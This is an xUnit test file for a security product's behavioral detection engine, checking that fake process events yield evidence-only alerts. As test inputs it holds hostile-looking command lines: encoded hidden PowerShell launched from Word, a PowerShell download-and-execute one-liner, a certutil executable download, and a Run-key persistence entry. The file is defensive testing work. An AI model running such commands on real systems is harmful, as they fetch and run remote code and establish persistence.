using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using DataVanger.Classification;
using DataVanger.Core;
using DataVanger.Core.Abstractions;
using DataVanger.Core.Domain;
using DataVanger.Detection;
using DataVanger.Engine;
using DataVanger.Memory;
using DataVanger.Memory.Readers;
using DataVanger.Memory.Rules;
using DataVanger.Reputation;
using static DataVanger.Tests.Fixtures.PeFactory;

// Phase 09 decomposition — Behavioral Engine Runtime Binding (Phase 2 / Step 06). Filter: ~Behavioral.
// Faithful move of the legacy mega-[Fact] section into an independently
// runnable, filterable [Fact]. Body is verbatim; the private Assert shim
// delegates to LegacyAssert.True so condition AND message are preserved.
public class BehavioralRuntimeBindingTests
{
    private static void Assert(bool condition, string message) => LegacyAssert.True(condition, message);

    [Xunit.Fact]
    public async Task BehavioralRuntimeBinding_AllLegacyChecks()
// 29. Behavioral Engine Runtime Binding (Phase 2 / Step 06) — deterministic,
//     development-safe tests. The binding consumes normalized runtime events
//     (fake/in-memory — never real ETW), maps them into behavioral
//     observations, correlates short-lived process lineage in bounded,
//     TTL-cleaned state, evaluates conservative runtime rules, and emits
//     behavioral evidence that is EVIDENCE ONLY (never ConfirmedMalware,
//     never quarantine/kill/suspend/block). No admin, no network, no
//     background loops, no sleeps.
{
    var brbNow = new DateTimeOffset(2026, 5, 27, 0, 0, 0, TimeSpan.Zero);

    static DataVanger.Shared.RuntimeEvents.RuntimeSecurityEvent BrbProcStart(
        int pid, string name, int? ppid = null, string? parentName = null,
        string? image = null, string? cmd = null, DateTimeOffset? ts = null)
    {
        var meta = new Dictionary<string, string>(StringComparer.Ordinal);
        if (cmd != null) meta["etw.command_line"] = cmd;
        if (image != null) meta["etw.image_path"] = image;
        return new DataVanger.Shared.RuntimeEvents.RuntimeSecurityEvent
        {
            Source = DataVanger.Shared.RuntimeEvents.RuntimeEventSource.EtwTelemetry,
            Category = DataVanger.Shared.RuntimeEvents.RuntimeEventCategory.ProcessCreated,
            ProcessId = pid,
            ProcessName = name,
            ParentProcessId = ppid,
            ParentProcessName = parentName,
            SubjectPath = image,
            TimestampUtc = ts ?? new DateTimeOffset(2026, 5, 27, 0, 0, 0, TimeSpan.Zero),
            Metadata = meta,
        };
    }

    // 29a. Disabled mode generates no evidence and reports Disabled.
    {
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions.Disabled(),
            pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        await binding.HandleAsync(BrbProcStart(10, "powershell.exe", 5, "winword.exe",
            cmd: "powershell.exe -enc QQBCAA== -w hidden")).AsTask();
        var s = binding.GetStatus();
        Assert(s.State == DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingState.Disabled,
            "Disabled binding must report Disabled state.");
        Assert(!s.Enabled, "Disabled binding must report Enabled=false.");
        Assert(s.EvidenceGenerated == 0 && sink.Items.Count == 0,
            "Disabled binding must generate no behavioral evidence.");
    }

    // 29b. Passive/development mode can generate evidence WITHOUT any action.
    //      winword.exe -> powershell.exe -EncodedCommand -w hidden generates
    //      both Office-lineage and PowerShell evidence; never ConfirmedMalware.
    {
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions.DevelopmentSafe(),
            pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        // Parent first so correlation resolves pid 100 -> await winword.exe.
        _ = binding.HandleAsync(BrbProcStart(100, "winword.exe")).AsTask();  // CS4014: intentional fire-and-forget (original behaviour; result deliberately not observed here)
        await binding.HandleAsync(BrbProcStart(200, "powershell.exe", ppid: 100,
            cmd: "powershell.exe -EncodedCommand QQBCAA== -w hidden")).AsTask();

        Assert(sink.Items.Any(e => e.RuleId == "BRB-R1"),
            "Office spawning PowerShell must generate process-lineage evidence (BRB-R1).");
        var ps = sink.Items.FirstOrDefault(e => e.RuleId == "BRB-R2");
        Assert(ps != null, "Encoded+hidden PowerShell must generate evidence (BRB-R2).");
        Assert(ps!.Severity == DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeSeverity.HighRisk,
            "Encoded + hidden combination should be HighRisk behavioral evidence.");
        Assert(sink.Items.All(e => !e.IsConfirmedMalware),
            "Behavioral evidence must NEVER be ConfirmedMalware.");
        Assert(sink.Items.All(e =>
                e.Severity <= DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeSeverity.HighRisk),
            "Behavioral severity must never exceed HighRisk.");
        var s = binding.GetStatus();
        Assert(s.State == DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingState.Passive,
            "DevelopmentSafe() defaults to passive mode (no actions).");
        Assert(s.EvidenceGenerated >= 2, "Both lineage and PowerShell evidence must be counted.");
    }

    // 29c. Encoded, hidden and dynamic PowerShell command lines are detected
    //      (the runtime indicator detector mirrors CommandLineAnalyzer's spirit).
    {
        var enc = DataVanger.Engine.Behavioral.Runtime.BehavioralCommandLineIndicators
            .DetectPowerShellIndicators("powershell.exe", "powershell.exe -enc QQ==");
        Assert(enc.Contains("powershell-encoded-command"), "Must tag encoded command.");

        var hid = DataVanger.Engine.Behavioral.Runtime.BehavioralCommandLineIndicators
            .DetectPowerShellIndicators("powershell.exe", "powershell.exe -windowstyle hidden");
        Assert(hid.Contains("powershell-hidden-window"), "Must tag hidden window.");

        var dyn = DataVanger.Engine.Behavioral.Runtime.BehavioralCommandLineIndicators
            .DetectPowerShellIndicators("powershell.exe",
                "powershell.exe iex(new-object net.webclient).downloadstring('http://x')");
        Assert(dyn.Contains("powershell-dynamic-execution"), "Must tag dynamic execution.");

        // Benign PowerShell (no risky args) yields only the descriptive
        // process tag and produces no suspicious evidence on its own.
        var benign = DataVanger.Engine.Behavioral.Runtime.BehavioralCommandLineIndicators
            .DetectPowerShellIndicators("powershell.exe", "powershell.exe -NoProfile -File build.ps1");
        Assert(benign.Count == 1 && benign[0] == "powershell-process",
            "Benign PowerShell must not be tagged as encoded/hidden/dynamic.");
    }

    // 29d. Benign LOLBin usage in benign context produces NO high-risk evidence.
    {
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions.DevelopmentSafe(),
            pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        await binding.HandleAsync(BrbProcStart(300, "explorer.exe")).AsTask();
        await binding.HandleAsync(BrbProcStart(301, "rundll32.exe", ppid: 300,
            cmd: "rundll32.exe shell32.dll,Control_RunDLL")).AsTask();
        Assert(sink.Items.Count == 0,
            "Benign LOLBin usage with a benign parent and benign args must not produce evidence.");
    }

    // 29e. Suspicious LOLBin usage (context-sensitive) generates evidence.
    {
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions.DevelopmentSafe(),
            pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        await binding.HandleAsync(BrbProcStart(400, "certutil.exe",
            cmd: "certutil.exe -urlcache -split -f http://example/x.exe x.exe"))
            .AsTask();
        Assert(sink.Items.Any(e => e.RuleId == "BRB-R3"),
            "certutil download pattern must produce LOLBin evidence (BRB-R3).");
        Assert(sink.Items.All(e => !e.IsConfirmedMalware),
            "LOLBin evidence must never be ConfirmedMalware.");
    }

    // 29f. Executable from a user-writable risky path is low-severity by itself.
    {
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions.DevelopmentSafe(),
            pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        await binding.HandleAsync(BrbProcStart(500, "thing.exe",
            image: @"C:\Users\bob\AppData\Local\Temp\thing.exe")).AsTask();
        var risky = sink.Items.FirstOrDefault(e => e.RuleId == "BRB-R4");
        Assert(risky != null, "Executable from Temp must produce risky-path evidence (BRB-R4).");
        Assert(risky!.Severity == DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeSeverity.Low,
            "Risky-path evidence alone must be low severity.");
    }

    // 29g. Persistence and tamper events (only when present in the pipeline)
    //      yield evidence-only, never ConfirmedMalware.
    {
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions.DevelopmentSafe(),
            pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        await binding.HandleAsync(new DataVanger.Shared.RuntimeEvents.RuntimeSecurityEvent
        {
            Category = DataVanger.Shared.RuntimeEvents.RuntimeEventCategory.PersistenceObserved,
            SubjectPath = @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\evil",
            TimestampUtc = brbNow,
        }).AsTask();
        await binding.HandleAsync(new DataVanger.Shared.RuntimeEvents.RuntimeSecurityEvent
        {
            Category = DataVanger.Shared.RuntimeEvents.RuntimeEventCategory.TamperObserved,
            SubjectPath = "WindowsDefender",
            TimestampUtc = brbNow,
        }).AsTask();
        Assert(sink.Items.Any(e => e.RuleId == "BRB-R5"), "Persistence event must produce evidence (BRB-R5).");
        Assert(sink.Items.Any(e => e.RuleId == "BRB-R6"), "Tamper event must produce evidence (BRB-R6).");
        Assert(sink.Items.All(e => !e.IsConfirmedMalware),
            "Persistence/tamper evidence must never be ConfirmedMalware.");
    }

    // 29h. Bounded correlation state: tracked count never exceeds the limit;
    //      eviction increments the dropped counter and degrades gracefully.
    {
        var opts = new DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions
        {
            Enabled = true,
            MaxTrackedProcesses = 3,
        };
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            opts, pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        for (int i = 0; i < 12; i++)
        {
            await binding.HandleAsync(BrbProcStart(1000 + i, "notepad.exe")).AsTask();
        }
        var s = binding.GetStatus();
        Assert(s.TrackedProcesses <= 3, "Correlation state must respect MaxTrackedProcesses.");
        Assert(s.EventsDropped > 0, "State-pressure eviction must increment the dropped counter.");
        Assert(s.State == DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingState.Degraded,
            "Reaching the state limit must degrade gracefully (not crash).");
        Assert(s.LastWarning != null && s.LastWarning.Contains("state limit"),
            "Degraded status must carry a state-limit warning.");
    }

    // 29i. TTL cleanup expires old process state deterministically.
    {
        var state = new DataVanger.Engine.Behavioral.Runtime.BehavioralCorrelationState(
            100, TimeSpan.FromMinutes(10));
        state.Observe(1, brbNow, out _, processName: "a.exe");
        Assert(state.Count == 1, "Process state must be tracked.");
        state.Prune(brbNow.AddMinutes(11));
        Assert(state.Count == 0, "TTL cleanup must expire stale process state.");
        Assert(state.Expirations == 1, "TTL expirations must be counted.");
    }

    // 29j. Rate limiting drops overflow events and counts them.
    {
        var opts = new DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions
        {
            Enabled = true,
            MaxEventsPerMinute = 2,
        };
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            opts, pipeline: null, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        for (int i = 0; i < 5; i++)
        {
            await binding.HandleAsync(BrbProcStart(2000 + i, "notepad.exe")).AsTask();
        }
        var s = binding.GetStatus();
        Assert(s.EventsReceived == 5, "All received events must be counted.");
        Assert(s.EventsDropped >= 3, "Rate-limit overflow must be dropped and counted.");
    }

    // 29k. Pipeline subscription, start/stop idempotency, cancellation, and
    //      no surviving background work.
    {
        using var brbPipeline = new DataVanger.Engine.RuntimeEvents.InMemoryRuntimeEventPipeline();
        var sink = new CollectingBehavioralEvidenceSink();
        using var binding = new DataVanger.Engine.Behavioral.Runtime.BehavioralRuntimeBinding(
            DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeBindingOptions.DevelopmentSafe(),
            pipeline: brbPipeline, evidenceSink: sink, timeProvider: () => brbNow);
        await binding.StartAsync();
        await binding.StartAsync(); // idempotent
        await brbPipeline.PublishAsync(BrbProcStart(3000, "powershell.exe",
            cmd: "powershell.exe -enc QQ== -w hidden")).AsTask();
        Assert(sink.Items.Count >= 1, "Pipeline-driven events must reach the binding.");

        await binding.StopAsync();
        await binding.StopAsync(); // idempotent
        var afterStop = sink.Items.Count;
        await brbPipeline.PublishAsync(BrbProcStart(3001, "powershell.exe",
            cmd: "powershell.exe -enc QQ== -w hidden")).AsTask();
        Assert(sink.Items.Count == afterStop,
            "After StopAsync the binding must be unsubscribed and inert.");

        // Repeated start/stop is await safe.
        _ = binding.StartAsync();  // CS4014: intentional fire-and-forget (original behaviour; result deliberately not observed here)
        await binding.StopAsync();

        // Cancellation is respected and never throws.
        var cancelledBindingToken = new CancellationToken(canceled: true);
        await binding.HandleAsync(BrbProcStart(3002, "powershell.exe"), cancelledBindingToken)
            .AsTask();
    }

    // 29l. Anti-FP structural guarantee: behavioral evidence exposes no
    //      confirmation/remediation surface and IsConfirmedMalware is constant.
    {
        var t = typeof(DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeEvidence);
        var remediation = t.GetProperties()
            .Where(p =>
                p.Name.Contains("Quarantine", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Kill", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Suspend", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Block", StringComparison.OrdinalIgnoreCase) ||
                p.Name.Contains("Inject", StringComparison.OrdinalIgnoreCase))
            .ToArray();
        Assert(remediation.Length == 0,
            "BehavioralRuntimeEvidence must NOT expose any remediation surface.");
        var evidence = new DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeEvidence();
        Assert(!evidence.IsConfirmedMalware,
            "BehavioralRuntimeEvidence.IsConfirmedMalware must be a constant false.");
        // The severity enum must have no member above HighRisk.
        var maxSeverity = Enum.GetValues(typeof(DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeSeverity))
            .Cast<int>().Max();
        Assert(maxSeverity == (int)DataVanger.Shared.Behavioral.Runtime.BehavioralRuntimeSeverity.HighRisk,
            "BehavioralRuntimeSeverity must top out at HighRisk (no Confirmed member).");
    }
}

}
